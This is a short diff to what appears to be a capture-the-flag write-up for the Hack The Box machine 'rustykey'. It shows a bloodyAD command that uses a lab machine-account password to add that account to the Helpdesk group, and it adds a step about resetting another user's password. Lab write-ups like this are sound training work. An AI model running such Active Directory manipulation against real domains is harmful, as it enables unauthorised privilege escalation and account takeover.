@@ -89,7 +89,11 @@
 
 `sudo python3 /opt/bloodyAD/bloodyAD.py -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' add groupMember Helpdesk 'IT-Computer3$'`
 
+![image](https://github.com/user-attachments/assets/bc7eb631-1379-4863-89ff-9d9dc105ffdf)
 
+15. Now change bb.morgan's password, again, using bloodyAD
+
+``
 
 
 
